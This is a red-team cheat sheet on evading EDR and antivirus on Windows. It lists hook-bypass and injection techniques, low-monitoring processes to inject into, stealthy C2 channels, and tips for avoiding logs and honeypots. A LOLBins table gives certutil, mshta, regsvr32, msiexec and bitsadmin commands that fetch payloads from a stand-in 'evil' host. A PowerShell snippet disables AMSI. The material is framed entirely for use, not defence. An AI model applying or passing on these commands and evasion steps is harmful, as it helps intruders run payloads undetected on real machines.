# EDR/AV Bypass and Covert Operations Quick Reference

> Source: summaries of multiple red team field experiences (2024-2026)
> Applicable scenarios: consult when operating in an environment protected by EDR/AV

---

## Detection Layers and Corresponding Bypasses

| Detection layer | What the EDR does | Bypass approach |
|--------|-----------|---------|
| Static signatures | Match known malicious file hashes/signatures | Custom compilation, encrypted payloads, signature modification |
| User-mode hooks | Hook ntdll.dll to monitor API calls | Direct syscalls / unhooking / bring your own ntdll |
| Kernel callbacks | Register process/thread/image-load callbacks | Callback removal (needs a driver) / inject into legitimate processes |
| ETW | Collect events via ETW | Patch EtwEventWrite / disable providers |
| Behavioral analysis | Analyze call sequences and behavior patterns | Delayed execution / spread out operations / mimic normal behavior |
| Memory scanning | Periodically scan process memory | Heap encryption / encrypt payload during Sleep / module stomping |
| Network detection | Analyze egress traffic signatures | Domain fronting / legitimate service tunneling / encryption |

---

## Practical Bypass Techniques

### 1. Direct syscalls (bypassing user-mode hooks)

```
Principle: skip ntdll.dll and invoke the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all user-mode hooks
```

### 2. Unhooking (restore the original ntdll)

```
Method A: re-map ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restores hooked APIs to their original state
```

### 3. Process injection (pick low-monitoring targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (heavily monitored)
- svchost.exe (a focus of some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scanning sees a legitimate module, not suspicious RWX memory
```

### 5. Sleep encryption (Ekko/Zilean)

```
Principle: the beacon encrypts its own memory while sleeping
Effect: memory scans find no payload signatures
Implementation: register a timer callback, encrypt before sleep, decrypt on wake
```

### 6. Call stack spoofing

```
Principle: forge the call stack so API calls appear to come from legitimate code
Effect: bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Stealth

| Technique | Principle | Detection difficulty |
|------|------|---------|
| Domain fronting | SNI and Host header differ in HTTPS requests | High |
| Cloudflare Workers | Relay through CF, looks like normal HTTPS | High |
| Azure/AWS legitimate services | Use cloud service APIs as the C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connections mixed into normal web traffic | Medium |
| ICMP tunneling | Data hidden inside ICMP packets | Low (easily discovered) |

---

## LOLBins (Living Off the Land)

Use built-in legitimate programs to perform malicious operations:

| Program | Purpose | Example command |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLLs | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be signature-detected)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier: reflection-modify AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Minimal action principle** — don't touch what you don't have to; reuse existing credentials instead of creating new ones
2. **Time windows** — operate outside the target's working hours (reduces the chance of manual review)
3. **Traffic blending** — make C2 communication frequency and size mimic normal business traffic
4. **No tools on disk** — execute in memory, clean up after use
5. **Log awareness** — know which operations produce which logs, avoid them up front or clean up afterward
6. **Honeypot identification** — identify honeypots before operating (unusually open services, too-tempting credentials)
7. **Segmented operations** — do not complete all steps at once; spread them across multiple time windows
